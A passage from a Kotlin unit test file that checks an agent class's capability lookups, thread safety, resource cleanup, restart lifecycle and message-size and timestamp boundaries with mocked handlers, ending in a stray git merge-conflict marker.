        @DisplayName("Should handle case-insensitive capability checks")
        fun shouldHandleCaseInsensitiveCapabilityChecks() {
            // Given
            val lowerCaseCapability = "chat"
            val upperCaseCapability = "CHAT"
            val mixedCaseCapability = "ChAt"
            
            // When
            val hasLowerCase = auraAgent.hasCapability(lowerCaseCapability)
            val hasUpperCase = auraAgent.hasCapability(upperCaseCapability)
            val hasMixedCase = auraAgent.hasCapability(mixedCaseCapability)
            
            // Then
            assertTrue(hasLowerCase)
            assertTrue(hasUpperCase)
            assertTrue(hasMixedCase)
        }

        @Test
        @DisplayName("Should handle capability check with special characters")
        fun shouldHandleCapabilityCheckWithSpecialCharacters() {
            // Given
            val specialCapability = "CHAT@#$%"
            
            // When
            val hasCapability = auraAgent.hasCapability(specialCapability)
            
            // Then
            assertFalse(hasCapability)
        }

        @Test
        @DisplayName("Should return immutable capabilities list")
        fun shouldReturnImmutableCapabilitiesList() {
            // When
            val capabilities = auraAgent.getCapabilities()
            
            // Then
            assertFailsWith<UnsupportedOperationException> {
                capabilities.add("NEW_CAPABILITY")
            }
        }
    }

    @Nested
    @DisplayName("Thread Safety Tests")
    inner class ThreadSafetyTests {

        @Test
        @DisplayName("Should handle concurrent start and stop operations safely")
        fun shouldHandleConcurrentStartAndStopOperationsSafely() = runTest {
            // Given
            val latch = CountDownLatch(10)
            val threads = mutableListOf<Thread>()
            
            // When
            repeat(10) { index ->
                val thread = Thread {
                    try {
                        if (index % 2 == 0) {
                            auraAgent.start()
                        } else {
                            auraAgent.stop()
                        }
                    } finally {
                        latch.countDown()
                    }
                }
                threads.add(thread)
                thread.start()
            }
            
            latch.await(5, TimeUnit.SECONDS)
            
            // Then
            // Agent should be in a consistent state
            assertTrue(auraAgent.isInitialized())
            // No exceptions should be thrown
        }

        @Test
        @DisplayName("Should handle concurrent configuration updates safely")
        fun shouldHandleConcurrentConfigurationUpdatesSafely() = runTest {
            // Given
            val configs = listOf(
                AgentConfiguration("Agent1", "1.0.0", listOf("CHAT"), 5),
                AgentConfiguration("Agent2", "2.0.0", listOf("ANALYSIS"), 10),
                AgentConfiguration("Agent3", "3.0.0", listOf("TRANSLATION"), 15)
            )
            
            val latch = CountDownLatch(3)
            
            // When
            configs.forEach { config ->
                Thread {
                    try {
                        whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(config)
                        auraAgent.handleConfigurationChanged()
                    } finally {
                        latch.countDown()
                    }
                }.start()
            }
            
            latch.await(5, TimeUnit.SECONDS)
            
            // Then
            // Agent should be in a consistent state with one of the configurations
            assertTrue(auraAgent.isInitialized())
            assertNotNull(auraAgent.getName())
            assertNotNull(auraAgent.getVersion())
        }
    }

    @Nested
    @DisplayName("Resource Management Edge Cases Tests")
    inner class ResourceManagementEdgeCasesTests {

        @Test
        @DisplayName("Should handle resource cleanup during shutdown")
        fun shouldHandleResourceCleanupDuringShutdown() = runTest {
            // Given
            auraAgent.start()
            
            // Process some messages to create resources
            val messages = (1..5).map { index ->
                AgentMessage(
                    id = "cleanup-$index",
                    type = MessageType.TEXT,
                    content = "Cleanup message $index",
                    timestamp = System.currentTimeMillis()
                )
            }
            
            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
            whenever(mockMessageHandler.processMessage(any())).thenReturn(
                AgentResponse(
                    messageId = "test",
                    content = "Processed",
                    status = ResponseStatus.SUCCESS
                )
            )
            
            messages.forEach { message ->
                auraAgent.processMessage(message)
            }
            
            // When
            auraAgent.shutdown()
            
            // Then
            assertTrue(auraAgent.isShutdown())
            assertEquals(0, auraAgent.getActiveTaskCount())
            assertTrue(auraAgent.getResourceUsage().memoryUsage < 1024 * 1024)
        }

        @Test
        @DisplayName("Should handle memory pressure gracefully")
        fun shouldHandleMemoryPressureGracefully() = runTest {
            // Given
            val largeMessages = (1..100).map { index ->
                AgentMessage(
                    id = "large-$index",
                    type = MessageType.TEXT,
                    content = "x".repeat(100000), // 100KB each
                    timestamp = System.currentTimeMillis()
                )
            }
            
            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
            whenever(mockMessageHandler.processMessage(any())).thenReturn(
                AgentResponse(
                    messageId = "test",
                    content = "Processed",
                    status = ResponseStatus.SUCCESS
                )
            )
            
            // When
            largeMessages.forEach { message ->
                auraAgent.processMessage(message)
            }
            
            // Then
            // Agent should still be functional
            assertTrue(auraAgent.isInitialized())
            assertEquals(0, auraAgent.getActiveTaskCount())
        }
    }

    @Nested
    @DisplayName("Integration-Style Tests")
    inner class IntegrationStyleTests {

        @Test
        @DisplayName("Should handle complete message lifecycle")
        fun shouldHandleCompleteMessageLifecycle() = runTest {
            // Given
            val message = AgentMessage(
                id = "lifecycle-001",
                type = MessageType.TEXT,
                content = "Complete lifecycle test",
                timestamp = System.currentTimeMillis()
            )
            
            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
            whenever(mockMessageHandler.processMessage(any())).thenReturn(
                AgentResponse(
                    messageId = message.id,
                    content = "Lifecycle complete",
                    status = ResponseStatus.SUCCESS
                )
            )
            
            // When
            auraAgent.start()
            val response = auraAgent.processMessage(message)
            auraAgent.stop()
            
            // Then
            assertNotNull(response)
            assertEquals(ResponseStatus.SUCCESS, response.status)
            
            // Verify complete interaction chain
            verify(mockMessageHandler).validateMessage(message)
            verify(mockMessageHandler).processMessage(message)
            verify(mockEventBus).publish(argThat { event ->
                event.type == EventType.MESSAGE_PROCESSED
            })
        }

        @Test
        @DisplayName("Should handle agent restart scenario")
        fun shouldHandleAgentRestartScenario() = runTest {
            // Given
            val message = AgentMessage(
                id = "restart-001",
                type = MessageType.TEXT,
                content = "Restart test",
                timestamp = System.currentTimeMillis()
            )
            
            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
            whenever(mockMessageHandler.processMessage(any())).thenReturn(
                AgentResponse(
                    messageId = message.id,
                    content = "Restart response",
                    status = ResponseStatus.SUCCESS
                )
            )
            
            // When
            auraAgent.start()
            auraAgent.processMessage(message)
            auraAgent.stop()
            
            // Restart
            auraAgent.start()
            val response = auraAgent.processMessage(message)
            auraAgent.stop()
            
            // Then
            assertNotNull(response)
            assertEquals(ResponseStatus.SUCCESS, response.status)
            
            // Verify agent can be restarted successfully
            verify(mockEventBus, times(2)).publish(argThat { event ->
                event.type == EventType.AGENT_STARTED
            })
            verify(mockEventBus, times(2)).publish(argThat { event ->
                event.type == EventType.AGENT_STOPPED
            })
        }
    }

    @Nested
    @DisplayName("Boundary Value Tests")
    inner class BoundaryValueTests {

        @Test
        @DisplayName("Should handle message at exact character limit")
        fun shouldHandleMessageAtExactCharacterLimit() = runTest {
            // Given
            val maxLength = 65536 // Assuming 64KB limit
            val exactLimitMessage = AgentMessage(
                id = "limit-001",
                type = MessageType.TEXT,
                content = "x".repeat(maxLength),
                timestamp = System.currentTimeMillis()
            )
            
            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
            whenever(mockMessageHandler.processMessage(any())).thenReturn(
                AgentResponse(
                    messageId = exactLimitMessage.id,
                    content = "Processed at limit",
                    status = ResponseStatus.SUCCESS
                )
            )
            
            // When
            val response = auraAgent.processMessage(exactLimitMessage)
            
            // Then
            assertNotNull(response)
            assertEquals(ResponseStatus.SUCCESS, response.status)
        }

        @Test
        @DisplayName("Should handle message exceeding character limit")
        fun shouldHandleMessageExceedingCharacterLimit() = runTest {
            // Given
            val oversizedMessage = AgentMessage(
                id = "oversized-001",
                type = MessageType.TEXT,
                content = "x".repeat(1000000), // 1MB
                timestamp = System.currentTimeMillis()
            )
            
            whenever(mockMessageHandler.validateMessage(any())).thenReturn(false)
            
            // When
            val response = auraAgent.processMessage(oversizedMessage)
            
            // Then
            assertNotNull(response)
            assertEquals(ResponseStatus.VALIDATION_ERROR, response.status)
        }

        @Test
        @DisplayName("Should handle minimum valid timestamp")
        fun shouldHandleMinimumValidTimestamp() = runTest {
            // Given
            val minTimestampMessage = AgentMessage(
                id = "min-timestamp-001",
                type = MessageType.TEXT,
                content = "Minimum timestamp test",
                timestamp = 1L
            )
            
            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
            whenever(mockMessageHandler.processMessage(any())).thenReturn(
                AgentResponse(
                    messageId = minTimestampMessage.id,
                    content = "Processed min timestamp",
                    status = ResponseStatus.SUCCESS
                )
            )
            
            // When
            val response = auraAgent.processMessage(minTimestampMessage)
            
            // Then
            assertNotNull(response)
            assertEquals(ResponseStatus.SUCCESS, response.status)
        }

        @Test
        @DisplayName("Should handle maximum valid timestamp")
        fun shouldHandleMaximumValidTimestamp() = runTest {
            // Given
            val maxTimestampMessage = AgentMessage(
                id = "max-timestamp-001",
                type = MessageType.TEXT,
                content = "Maximum timestamp test",
                timestamp = Long.MAX_VALUE
            )
            
            whenever(mockMessageHandler.validateMessage(any())).thenReturn(false)
            
            // When
            val response = auraAgent.processMessage(maxTimestampMessage)
            
            // Then
            assertNotNull(response)
            assertEquals(ResponseStatus.VALIDATION_ERROR, response.status)
        }
    }
>>>>>>> origin/coderabbitai/docstrings/78f34ad
}